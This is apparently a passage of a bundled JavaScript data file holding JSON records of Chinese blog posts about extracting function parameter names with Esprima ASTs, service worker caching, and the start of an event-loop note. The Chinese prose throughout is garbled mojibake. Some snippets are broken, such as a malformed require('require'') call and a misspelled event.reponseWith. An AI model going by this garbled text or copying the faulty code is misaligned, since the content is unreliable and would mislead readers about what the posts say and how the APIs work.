href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reselect/README.md\\">æ›´å¤šå…³äºreselectçš„å­¦ä¹ </a></p>\\n","toc":[{"anchor":"reselect","level":2,"text":"Reselect"}],"relatedTags":null,"created_at":"2018-06-28","timeArr":[2018,5,28,0,0,0,0],"title":"reselect","uuid":"e28099171dfe31f2da457cda1c3b45aac1715cd2","summary":"<h4>Reselect</h4>\\n<p>å½“æˆ‘ä»¬ä½¿ç”¨reduxçš„<code>connect(mapStateToProps)</code>çš„æ—¶å€™</p>\\n<p>æœ‰æ—¶å€™storeçš„æ•°æ®ç›´æ¥ä¼ è¿›ç»„ä»¶å¹¶ä¸å¥½ï¼Œäºæ˜¯æˆ‘ä»¬å¸Œæœ›åœ¨å°†æ•°æ®ä¼ è¿›ç»„ä»¶å‰ï¼Œè¿›è¡Œè°ƒæ•´</p>\\n<p>ä¾‹å¦‚ storeå¦‚ä¸‹</p>\\n<pre class=\\"hljs\\"><code>const mockStore={\\n  descriptions:[\\n    {name:&quot;a...</code></pre>","slug":"reselect","sha":"f0d4f2e822ae9afefb2da674e748cd479eef8231"}')},634:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"xie-zai-zui-qian\\">å†™åœ¨æœ€å‰</h3>\\n<p>æœ€è¿‘é¡¹ç›®æœ‰ä¸ªéœ€æ±‚ï¼Œè·å–å‡½æ•°å‚æ•°åï¼Œå¬èµ·æ¥å¾ˆç®€å•ï¼Œä½†æœ‰äº†ES6ï¼Œå‚æ•°å’Œå‡½æ•°å†™æ³•åƒå¥‡ç™¾æ€ªï¼Œåœ¨githubä¸Šå¤§æ¦‚çœ‹äº†å‡ ä¸ªåº“ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯æ­£åˆ™ï¼Œ\\nå¯¹é€šç”¨çš„å†™æ³•èƒ½å¤Ÿè¦†ç›–ï¼Œç¨å¾®è¶Šè¿‡è¾¹ç•Œï¼Œå¾€å¾€æ— æ³•æ­£ç¡®åŒ¹é…ã€‚</p>\\n<p>äºæ˜¯å°±æœ‰äº†ä½¿ç”¨<code>AST</code>å»è¿›è¡Œè¦†ç›–æŸ¥æ‰¾çš„æƒ³æ³•ã€‚</p>\\n<h3 id=\\"gai-nian\\">æ¦‚å¿µ</h3>\\n<p>æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract syntax treeæˆ–è€…ç¼©å†™ä¸ºASTï¼‰ï¼Œæˆ–è€…è¯­æ³•æ ‘ï¼ˆsyntax treeï¼‰ï¼Œæ˜¯æºä»£ç çš„æŠ½è±¡è¯­æ³•ç»“æ„çš„æ ‘çŠ¶è¡¨ç°å½¢å¼ã€‚</p>\\n<hr>\\n<h3 id=\\"wei-shen-mo-yao-yong-ast\\">ä¸ºä»€ä¹ˆè¦ç”¨AST</h3>\\n<p>é€šè¿‡ASTï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ä»£ç è¿›è¡ŒæŸ¥æ‰¾ï¼Œçœ‹èµ·æ¥å¥½åƒæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿå¯ä»¥åšåˆ°ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¦ç”¨ASTè€Œä¸ç”¨æ­£åˆ™ï¼Ÿ</p>\\n<p>å°±è¯´ä»å‡½æ•°è·å–å‚æ•°åï¼Œå¤¸å¼ ç‚¹ï¼Œå¦‚æœæœ‰ä»¥ä¸‹è¡¨è¾¾å¼ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">x</span>(<span class=\\"hljs-params\\">a=<span class=\\"hljs-number\\">5</span>,b=<span class=\\"hljs-string\\">\\"a\\"</span>,c=function(x=<span class=\\"hljs-number\\">1</span>,y</span>)</span>{<span class=\\"hljs-built_in\\">console</span>.log(x=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">i=<span class=\\"hljs-number\\">8</span>,j</span>)</span>{})},d={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-string\\">\'x=6\'</span>},e=<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">x</span>=&gt;</span><span class=\\"hljs-number\\">7</span>,f=[<span class=\\"hljs-string\\">\'3=5\'</span>,<span class=\\"hljs-string\\">\'x.1\'</span>,<span class=\\"hljs-string\\">\'y,2\'</span>,<span class=\\"hljs-number\\">1</span>],g=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">x,y</span>)=&gt;</span>{<span class=\\"hljs-keyword\\">let</span> z=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">i,j=<span class=\\"hljs-number\\">6</span></span>)=&gt;</span>{}},h){}</code></pre></code></pre>\\n<p><code>å‚æ•°æ˜¯[a,b,c,d,e,f,g,h]</code></p>\\n<p>ä½ ç¡®å®šè¿˜æƒ³ç”¨æ­£åˆ™å»åŒ¹é…å‚æ•°åç§°å—...</p>\\n<blockquote>\\n<p>ASTæ˜¯ä»ä»£ç çš„æ„ä¹‰å»ç¼–è¾‘ï¼Œè€Œæ­£åˆ™åªèƒ½ä»ä»£ç çš„å­—é¢å»ç¼–è¾‘ã€‚</p>\\n</blockquote>\\n<p>ä»¥ä¸Šå¤¸å¼ çš„å‡½æ•°ï¼Œä½¿ç”¨ASTå»åˆ†æï¼Œå¯ä»¥å¾ˆè½»æ¾è·å–å®ƒçš„å‚æ•°åã€‚</p>\\n<hr>\\n<h3 id=\\"esprima\\">Esprima</h3>\\n<p>æˆ‘ä»¬ä½¿ç”¨<a href=\\"http://esprima.org/demo/parse.html#\\">esprima</a>ï¼Œä¸€ä¸ªå¯ä»¥å°†Javascriptä»£ç è§£ææˆæŠ½è±¡æ ‘çš„åº“ã€‚</p>\\n<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å®‰è£…å®ƒï¼š</p>\\n<p><code>npm install esprima</code></p>\\n<p>æ¥ç€è°ƒç”¨ï¼š</p>\\n<p><code>const esprima=require(&#39;require&#39;&#39;)</code></p>\\n<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ†æçš„æ—¶å€™äº†ã€‚</p>\\n<hr>\\n<h3 id=\\"yi-ge-jian-dan-de-ast-li-zi\\">ä¸€ä¸ªç®€å•çš„ASTä¾‹å­</h3>\\n<p>å…ˆæ¥ä¸ªç®€å•çš„ä¾‹å­ï¼š\\n<code>function a(b){}</code></p>\\n<p>é€šè¿‡esprimaè§£æåï¼Œç”Ÿæˆç»“æ„å›¾å¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n    &quot;type&quot;: &quot;Program&quot;,\\n    &quot;body&quot;: [\\n        {   // è¿™ä¸ªtypeè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼\\n            &quot;type&quot;: &quot;FunctionDeclaration&quot;,\\n            &quot;id&quot;: {\\n                &quot;type&quot;: &quot;Identifier&quot;,\\n                &quot;name&quot;: &quot;a&quot;\\n            },\\n            &quot;params&quot;: [\\n                {\\n                    // å‚æ•°æ•°ç»„å†…çš„Identifierä»£è¡¨å‚æ•°\\n                    &quot;type&quot;: &quot;Identifier&quot;,\\n                    &quot;name&quot;: &quot;b&quot;\\n                }\\n            ],\\n            &quot;body&quot;: {\\n                &quot;type&quot;: &quot;BlockStatement&quot;,\\n                &quot;body&quot;: []\\n            },\\n            &quot;generator&quot;: false,\\n            &quot;expression&quot;: false,\\n            &quot;async&quot;: false\\n        }\\n    ],\\n    &quot;sourceType&quot;: &quot;script&quot;\\n}</code></pre></code></pre><p>æ€è·¯ï¼š</p>\\n<ol>\\n<li><code>FunctionDeclaration</code>è¯´æ˜æ˜¯ä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼ï¼Œè¿›å…¥<code>params</code>å±æ€§ã€‚</li>\\n<li>åˆ¤æ–­<code>params</code>ä¸­æ¯ä¸€ä¸ªçš„typeæ˜¯å¦ä¸º<code>Identifier</code>ï¼Œåœ¨<code>params</code>å±æ€§ä¸‹çš„<code>Identifier</code>å°±ä»£è¡¨æ˜¯å‚æ•°ã€‚</li>\\n<li>æ‰¾å‡ºnameå±æ€§çš„å€¼ï¼Œç»“æœä¸º<code>[&#39;b&#39;]</code>ã€‚</li>\\n</ol>\\n<p>æ ¹æ®ä»¥ä¸Šæ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€ä¸ªç®€å•çš„è·å–å‚æ•°çš„æ–¹æ³•äº†ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">getParams</span>(<span class=\\"hljs-params\\">fn</span>)</span>{\\n  <span class=\\"hljs-comment\\">// æ­¤å¤„åˆ†æçš„ä»£ç å¿…é¡»æ˜¯å­—ç¬¦ä¸²</span>\\n  <span class=\\"hljs-keyword\\">let</span> astEsprima=esprima.parseScript(fn.toString())\\n  <span class=\\"hljs-keyword\\">let</span> funcParams = []\\n  <span class=\\"hljs-keyword\\">let</span> node = astEsprima.body[<span class=\\"hljs-number\\">0</span>]\\n  <span class=\\"hljs-comment\\">// æ‰¾åˆ°typeï¼Œè¿›å…¥paramså±æ€§</span>\\n  <span class=\\"hljs-keyword\\">if</span> (node.type === <span class=\\"hljs-string\\">\\"FunctionDeclaration\\"</span>) funcParams = node.params\\n  <span class=\\"hljs-keyword\\">let</span> validParam=[]\\n  funcParams.forEach(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">obj</span>=&gt;</span>{\\n    <span class=\\"hljs-keyword\\">if</span>(obj.type===<span class=\\"hljs-string\\">\\"Identifier\\"</span>)\\n      validParam.push(obj.name)\\n  })\\n  <span class=\\"hljs-keyword\\">return</span> validParam\\n}</code></pre></code></pre>\\n<p>æµ‹è¯•ä¸€ç•ªï¼Œè·å–ç»“æœ<code>[&quot;b&quot;]</code>ï¼Œåº†ç¥æ”¶å·¥ã€‚</p>\\n<p>å¥½å§ï¼Œåˆ«é«˜å…´å¤ªæ—©äº†ï¼Œè¦çŸ¥é“å‡½æ•°çš„åˆ›å»ºæ–¹æ³•ä¸ä¸‹10ç§ï¼Œè€Œå‚æ•°å†™æ³•åˆæœ‰å¥½å‡ ç§...</p>\\n<p>ä»¥ä¸‹æ˜¯ä¸€éƒ¨åˆ†çš„å‡½æ•°åˆ›å»ºæ–¹æ³•å’Œå‚æ•°å†™æ³•</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">a</span>(<span class=\\"hljs-params\\">x</span>)</span>{}\\n\\n<span class=\\"hljs-comment\\">// æ³¨æ„ï¼šç¬¬äºŒæ¡å’Œç¬¬ä¸‰æ¡åœ¨ASTä¸­æ„ä¹‰ä¸åŒ</span>\\n<span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">x=<span class=\\"hljs-number\\">1</span></span>)</span>{}\\n\\na=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">...x</span>)</span>{}\\n\\n<span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">[x]=[<span class=\\"hljs-number\\">1</span>]</span>)=&gt;</span>{}\\n\\n<span class=\\"hljs-keyword\\">async</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">a</span>(<span class=\\"hljs-params\\">x</span>)</span>{}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> *<span class=\\"hljs-title\\">a</span>(<span class=\\"hljs-params\\">x</span>)</span>{}\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">a</span></span>{\\n<span class=\\"hljs-keyword\\">constructor</span>(x){}\\n}\\n\\n<span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Function</span> (<span class=\\"hljs-string\\">\'x\'</span>,<span class=\\"hljs-string\\">\'console.log(x)\'</span>)\\n\\n(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">x</span>)</span>{}})()\\n\\n<span class=\\"hljs-built_in\\">eval</span>(<span class=\\"hljs-string\\">\\"(function(){return function(a,b){}})()\\"</span>)</code></pre></code></pre>\\n<p>æœ‰ä»€ä¹ˆæƒ³æ³•ï¼Ÿå¦‚æœä½ æœ‰å‘å‡º&quot;æˆ‘K&quot;çš„æƒ³æ³•ï¼Œé‚£è¯´æ˜æˆ‘è¿™ä¸ªè£…é€¼è¿˜ç®—æˆåŠŸ- -...</p>\\n<p>å…¶å®åªéœ€è¦åˆ†å‡ ç§æƒ…å†µ(å¾ˆå¤šå†™æ³•çš„typeéƒ½æ˜¯ä¸€è‡´çš„)ï¼Œå°±å¯ä»¥å®Œå…¨æ¸—å…¥åˆ°ä»¥ä¸Šæ‰€æœ‰çš„å‚æ•°å¯¹è±¡å†…éƒ¨ï¼Œå†è¿›è¡Œå‚æ•°è·å–å°±æ˜¯å¾ªç¯+åˆ¤æ–­è§£å†³çš„äº‹äº†ã€‚</p>\\n<p>ç”±äºç¯‡å¹…é—®é¢˜ï¼Œè¿™é‡Œä¸ä¸€ä¸€åˆ†æï¼Œåªæ˜¯å°†ASTåˆ†ææ ‘æ‰€ç”¨çš„typeå’Œä¸€äº›æ³¨æ„ç‚¹ã€‚</p>\\n<h3 id=\\"han-shu-jie-gou\\">å‡½æ•°ç»“æ„</h3>\\n<h4 id=\\"bian-liang-sheng-ming-yu-ju-he-biao-da-shi-yu-ju\\">å˜é‡å£°æ˜è¯­å¥å’Œè¡¨è¾¾å¼è¯­å¥</h4>\\n<p>ä¸Šé¢æ³¨é‡Šä¸­<code>let a=function(x=1){}</code>å’Œ<code>a=function(...x){}</code>æ˜¯ä¸¤ç§æ„ä¹‰ã€‚</p>\\n<p>å…¶ä¸­<code>let a=function(x=1){}</code>æŒ‡çš„æ˜¯å˜é‡å£°æ˜è¯­å¥ï¼Œ</p>\\n<p>å¯¹åº”çš„typeæ˜¯<code>VariableDeclaration</code>ï¼Œéœ€è¦è¿›å…¥å®ƒçš„åˆå§‹å€¼<code>init</code>å°±å¯ä»¥è·å–åˆ°å‡½æ•°æ‰€åœ¨çš„è¯­æ³•å¯¹è±¡ï¼Œå®ƒçš„typeæ˜¯<code>FunctionExpression</code>å‡½æ•°è¡¨è¾¾å¼ï¼Œå†å»<code>params</code>ä¸­æŸ¥æ‰¾å³å¯ã€‚</p>\\n<p>å˜é‡å£°æ˜è¯­å¥ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>â”œâ”€â”€VariableDeclaration....init\\n        â”œâ”€â”€FunctionExpression.params</code></pre></code></pre><p>è€Œ<code>a=function(...x){}</code>æ˜¯è¡¨è¾¾å¼è¯­å¥ï¼Œ</p>\\n<p>å¯¹åº”çš„typeæ˜¯<code>ExpressionStatement</code>ï¼Œéœ€è¦è¿›å…¥å®ƒçš„è¡¨è¾¾å¼<code>expression</code>è·å–åˆ°è¡¨è¾¾å¼å†…éƒ¨ï¼Œè¿™æ—¶æˆ‘ä»¬è¦è¿›å…¥èµ‹å€¼è¡¨è¾¾å¼(<code>typeä¸ºAssignmentExpression</code>)çš„å³è¾¹(<code>rightå±æ€§</code>)ï¼Œ\\nè·å–å‡½æ•°æ‰€åœ¨çš„è¯­æ³•å¯¹è±¡ï¼Œå®ƒçš„typeåŒæ ·ä¹Ÿæ˜¯<code>FunctionExpression</code>å‡½æ•°è¡¨è¾¾å¼ã€‚</p>\\n<p>è¡¨è¾¾å¼è¯­å¥ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>â”œâ”€â”€ExpressionStatement.expression\\n        â”œâ”€â”€AssignmentExpression.right\\n                â”œâ”€â”€FunctionExpression.params</code></pre></code></pre><h4 id=\\"class-sheng-ming-he-function-gou-zao-han-shu\\">classå£°æ˜å’ŒFunctionæ„é€ å‡½æ•°</h4>\\n<p>classå£°æ˜å¯¹åº”çš„typeæœ‰<code>ClassDeclaration</code>(class xx{...})æˆ–è€…<code>ClassExpression</code>(let x=class{...})ï¼Œä»–ä»¬ä¸€ä¸ªæ˜¯å£°æ˜ä¸€ä¸ªæ˜¯è¡¨è¾¾å¼ï¼Œå¤„ç†æ–¹å¼æ˜¯ç›¸åŒçš„ï¼Œ\\nè¿›å…¥å¯¹è±¡å†…éƒ¨ï¼Œæ‰¾åˆ°kindä¸º<code>constructor</code>çš„å¯¹è±¡ï¼Œè·å–å‚æ•°æ•°æ®ã€‚</p>\\n<p>classå£°æ˜è¯­å¥ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>â”œâ”€â”€ClassDeclaration...body...\\n        â”œâ”€â”€{kind:constructor}\\n                â”œâ”€â”€FunctionExpression.params</code></pre></code></pre><p>Functionæ„é€ å‡½æ•°å¯¹åº”çš„typeæ˜¯<code>NewExpression</code>æˆ–è€…<code>ClassExpression</code>ï¼Œå‚æ•°åœ¨å±æ€§<code>arguments</code>å†…éƒ¨ï¼Œä½†æ˜¯Functionçš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œ\\nè€Œä¸”æœ€åä¸€ä¸ªå‚æ•°ä¸€å®šæ˜¯å‡½æ•°å†…éƒ¨è¯­å¥ï¼Œå› æ­¤å¯¹äºFunctionæ„é€ å‡½æ•°ï¼Œå°±æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ã€‚</p>\\n<p>Functionæ„é€ å‡½æ•°</p>\\n<pre><code><pre class=\\"hljs\\"><code>â”œâ”€â”€NewExpression.arguments\\n        â”œâ”€â”€{value:&lt;String&gt;}\\n         ----&gt;å¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œåˆ†å‰²å‚æ•°</code></pre></code></pre><h4 id=\\"jian-tou-han-shu\\">ç®­å¤´å‡½æ•°</h4>\\n<p>ç®­å¤´å‡½æ•°typeæ˜¯<code>ArrowFunctionExpression</code>ï¼Œä¹Ÿä»…ä»…æ˜¯åç§°ä¸åŒï¼Œå†…éƒ¨ç»“æ„å‡ ä¹ä¸€è‡´ã€‚</p>\\n<p>å‡½æ•°ç»“æ„çš„typeå°±åˆ°æ­¤ã€‚</p>\\n<h3 id=\\"can-shu-jie-gou\\">å‚æ•°ç»“æ„</h3>\\n<p>å‚æ•°çš„typeæœ‰ä»¥ä¸‹ï¼š</p>\\n<p><code>Identifier</code>ï¼šæœ€ç»ˆæˆ‘ä»¬éœ€è¦è·å–çš„å‚æ•°å€¼çš„type</p>\\n<p><code>Property</code>ï¼šå½“å­˜åœ¨è§£æ„å‚æ•°ï¼Œä¾‹å¦‚<code>[a,b] or {x,y}</code></p>\\n<p><code>ArrayPattern</code>ï¼šå­˜åœ¨è§£æ„å‚æ•°å¹¶ä¸”æ˜¯æ•°ç»„ï¼Œä¾‹å¦‚<code>[a,b]</code></p>\\n<p><code>ObjectPattern</code>ï¼šå­˜åœ¨è§£æ„å‚æ•°å¹¶ä¸”æ˜¯å¯¹è±¡ï¼Œä¾‹å¦‚<code>{x,y}</code></p>\\n<p><code>RestElement</code>ï¼šå­˜åœ¨æ‰©å±•è¿ç®—ç¬¦ï¼Œä¾‹å¦‚<code>(...args)</code></p>\\n<p>æˆ‘ä»¬åªéœ€è¦è®¾ç½®ä¸€ä¸ªé€’å½’å¾ªç¯ï¼Œæ€è·¯å’Œä¸Šé¢ä¸€æ ·ï¼Œä¸€å±‚è¿›å…¥å¦ä¸€å±‚ï¼Œåœ¨å†…éƒ¨è¿›è¡ŒæŸ¥æ‰¾ã€‚</p>\\n<h3 id=\\"zong-jie\\">æ€»ç»“</h3>\\n<p>ç¯‡å¹…æœ‰é™ï¼Œå°±å†™è¿™ä¹ˆå¤šï¼Œæ¥ç€åšä¸€ä¸ªæ€»ç»“ã€‚</p>\\n<p>è¿™ç¯‡è®²çš„ä¸»æ—¨åªæœ‰1ä¸ªï¼Œé€šè¿‡å¯¹ASTæ ‘ä¸­æ¯ä¸€ä¸ªå¯¹è±¡çš„typeåˆ†æï¼Œtypeè¡¨ç¤ºçš„æ˜¯å¯¹åº”çš„ä»£ç çš„æ„ä¹‰ï¼Œä¹Ÿæ˜¯ä»£ç çš„è¯­ä¹‰ï¼Œä¾‹å¦‚</p>\\n<p><code>VariableDeclaration</code>å†…éƒ¨ä¸€å®šä¼šæœ‰<code>init</code>ï¼Œä¸ºä»€ä¹ˆï¼Œå› ä¸ºå˜é‡å£°æ˜æ˜¯æœ‰åˆå§‹å€¼çš„ï¼Œå¦‚æœä½ ä¸è®¾ç½®ï¼Œé‚£ä¹ˆå°±ä¸º<code>undefined</code></p>\\n<p>typeè¿œä¸æ­¢è¿™æ¬¡è¯´çš„è¿™ä¹ˆå¤šï¼Œå®˜ç½‘(æˆ–è€…Google)ä¸Šæœ‰è¯¦ç»†ä»‹ç»ã€‚</p>\\n<hr>\\n<h3 id=\\"zui-hou\\">æœ€å</h3>\\n<p><a href=\\"https://github.com/stonehank/get-function-params-with-ast\\"><code>ASTè·å–å‡½æ•°å‚æ•°</code>æºä»£ç åœ¨æ­¤</a>ã€‚</p>\\n<p>å¦‚æœæœ¬æ–‡å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œæ¬¢è¿STARï¼Œæˆ–è€…ä½ å¯¹æ­¤æœ‰ä»€ä¹ˆæ›´å¥½çš„æƒ³æ³•ï¼Œæ¬¢è¿ç•™è¨€ï¼</p>\\n<p>æœ€é‡è¦å¦‚æœå‘ç°äº†BUGæˆ–è€…æ¼åŒ¹é…ï¼Œè¯·ä¸€å®šè¦å‘ŠçŸ¥(Issue/PR/ç•™è¨€)ï¼Œæ„Ÿæ¿€ä¸å°½ï¼</p>\\n","toc":[{"anchor":"xie-zai-zui-qian","level":3,"text":"å†™åœ¨æœ€å‰"},{"anchor":"gai-nian","level":3,"text":"æ¦‚å¿µ"},{"anchor":"wei-shen-mo-yao-yong-ast","level":3,"text":"ä¸ºä»€ä¹ˆè¦ç”¨AST"},{"anchor":"esprima","level":3,"text":"Esprima"},{"anchor":"yi-ge-jian-dan-de-ast-li-zi","level":3,"text":"ä¸€ä¸ªç®€å•çš„ASTä¾‹å­"},{"anchor":"han-shu-jie-gou","level":3,"text":"å‡½æ•°ç»“æ„"},{"anchor":"bian-liang-sheng-ming-yu-ju-he-biao-da-shi-yu-ju","level":4,"text":"å˜é‡å£°æ˜è¯­å¥å’Œè¡¨è¾¾å¼è¯­å¥"},{"anchor":"class-sheng-ming-he-function-gou-zao-han-shu","level":4,"text":"classå£°æ˜å’ŒFunctionæ„é€ å‡½æ•°"},{"anchor":"jian-tou-han-shu","level":4,"text":"ç®­å¤´å‡½æ•°"},{"anchor":"can-shu-jie-gou","level":3,"text":"å‚æ•°ç»“æ„"},{"anchor":"zong-jie","level":3,"text":"æ€»ç»“"},{"anchor":"zui-hou","level":3,"text":"æœ€å"}],"relatedTags":null,"created_at":"2018-09-18","timeArr":[2018,8,18,0,0,0,0],"title":"å¦‚ä½•é€šè¿‡ASTæ ‘å»è·å–å‡½æ•°å‚æ•°å","uuid":"ddc3d1d8d6334cc464eb634a0d813d48c0d48776","summary":"<h4>å†™åœ¨æœ€å‰</h4>\\n<p>æœ€è¿‘é¡¹ç›®æœ‰ä¸ªéœ€æ±‚ï¼Œè·å–å‡½æ•°å‚æ•°åï¼Œå¬èµ·æ¥å¾ˆç®€å•ï¼Œä½†æœ‰äº†ES6ï¼Œå‚æ•°å’Œå‡½æ•°å†™æ³•åƒå¥‡ç™¾æ€ªï¼Œåœ¨githubä¸Šå¤§æ¦‚çœ‹äº†å‡ ä¸ªåº“ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯æ­£åˆ™ï¼Œ\\nå¯¹é€šç”¨çš„å†™æ³•èƒ½å¤Ÿè¦†ç›–ï¼Œç¨å¾®è¶Šè¿‡è¾¹ç•Œï¼Œå¾€å¾€æ— æ³•æ­£ç¡®åŒ¹é…ã€‚</p>\\n<p>äºæ˜¯å°±æœ‰äº†ä½¿ç”¨<code>AST</code>å»è¿›è¡Œè¦†ç›–æŸ¥æ‰¾çš„æƒ³æ³•ã€‚</p>\\n<h4>æ¦‚å¿µ</h4>\\n<p>æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract synta...</p>","slug":"ru-he-tong-guo-AST-shu-qu-huo-qu-han-shu-can-shu-ming","sha":"a7854a9c9c9dd7722bb525311af632ee5752fe47"}')},635:function(n){n.exports=JSON.parse('{"content":"<p>service workerå’Œcache</p>\\n<p>å®¢æˆ·ç«¯ï¼šregister</p>\\n<p>æœåŠ¡ç«¯ï¼šinstall, activate, fetch</p>\\n<ul>\\n<li><code>install</code></li>\\n</ul>\\n<p>ä¸»è¦ä½œç”¨æ˜¯å†…éƒ¨å›è°ƒä¸­çš„å‚æ•°<code>event</code>çš„æ–¹æ³•<code>event.waitUntil</code>ä¸­ç¼“å­˜æœ¬æ¬¡çš„èµ„æºã€‚</p>\\n<ul>\\n<li><code>activate</code></li>\\n</ul>\\n<p>ä¸»è¦ä½œç”¨æ˜¯åœ¨å†…éƒ¨å›è°ƒä¸­çš„å‚æ•°<code>event</code>çš„æ–¹æ³•<code>event.waitUntil</code>ä¸­æ¸…é™¤å½“å‰ä¸éœ€è¦çš„ç¼“å­˜ï¼Œå¹¶ä¸”é€šçŸ¥å½“å‰å·²ç»å‡†å¤‡å¥½æ¥å—æ§åˆ¶ã€‚</p>\\n<ul>\\n<li><code>fetch</code></li>\\n</ul>\\n<p>æ§åˆ¶é˜¶æ®µï¼Œåœ¨å†…éƒ¨å›è°ƒå‚æ•°<code>event</code>çš„æ–¹æ³•<code>event.reponseWith</code>ä¸­å¯ä»¥ä¿®æ”¹å“åº”å€¼</p>\\n<hr>\\n<p>é¢å¤–ï¼š</p>\\n<ul>\\n<li><p><code>waitUntil</code>å¯ä»¥å»¶é•¿promiseçš„ç”Ÿå‘½å‘¨æœŸ</p>\\n</li>\\n<li><p><code>caches</code>æ˜¯cacheStorageçš„è°ƒç”¨å€¼ï¼Œ<code>promise</code>çš„å½¢å¼</p>\\n</li>\\n</ul>\\n<p>ä¸»è¦ç”¨äºç¼“å­˜response(åŒæº)</p>\\n<p><code>caches.open</code> æ‰“å¼€ç¼“å­˜ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»ºï¼Œè¿”å›promise</p>\\n<p>ä¾‹å¦‚ï¼š<code>caches.open(...).then(cache=&gt;cache.add(&quot;url&quot;)</code></p>\\n<p><code>caches.keys</code> éå†ç¼“å­˜ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„promise</p>\\n<p><code>caches.match(url)</code> æ‰¾åˆ°å¹¶ä¸”è¿”å›ä¸€ä¸ªresolveè¿™ä¸ªåŒ¹é…çš„urlçš„promiseï¼Œæ‰¾ä¸åˆ°è¿”å›undefined</p>\\n<p><code>caches.has</code> æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨Cacheå¯¹è±¡ï¼Œæ‰¾åˆ°è¿”å›trueçš„promiseï¼Œå¦åˆ™è¿”å›falseçš„promise</p>\\n<p><code>caches.delete</code> æ‰¾åˆ°Cacheå¯¹è±¡åˆ™åˆ é™¤ï¼Œè¿”å›trueçš„promiseï¼Œå¦åˆ™è¿”å›falseçš„promise</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-26","timeArr":[2018,8,26,0,0,0,0],"title":"service-workerè¦ç‚¹æ¦‚æ‹¬","uuid":"39277c1a6e1a6c2280d116793ed086ee2507fa7e","summary":"<p>service workerå’Œcache</p>\\n<p>å®¢æˆ·ç«¯ï¼šregister</p>\\n<p>æœåŠ¡ç«¯ï¼šinstall, activate, fetch</p>\\n<ul>\\n<li><code>install</code></li>\\n</ul>\\n<p>ä¸»è¦ä½œç”¨æ˜¯å†…éƒ¨å›è°ƒä¸­çš„å‚æ•°<code>event</code>çš„æ–¹æ³•<code>event.waitUntil</code>ä¸­ç¼“å­˜æœ¬æ¬¡çš„èµ„æºã€‚</p>\\n<ul>\\n<li><code>activate</code></li>\\n</ul>\\n<p>ä¸»è¦ä½œç”¨æ˜¯åœ¨å†…éƒ¨å›è°ƒä¸­çš„å‚æ•°`e...</p>","slug":"service-worker-yao-dian-gai-kuo","sha":"e35e017c1e99651fcf6cabf2e7873c3ad59e795c"}')},636:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"chu-fa-su-du-pai-xu\\">è§¦å‘é€Ÿåº¦æ’åº</h3>\\n<p><code>nextTick</code> â†’ <code>Promise</code> â†’ <code>setTimeout</code> â†’ <code>setImmediate</code></p>\\n<h3 id=\\"guan-yu-wei-ren-wu-dui-lie\\">å…³äº<code>å¾®ä»»åŠ¡é˜Ÿåˆ—</code></h3>\\n<p>æ¯å½“JSæ‰§è¡Œæ 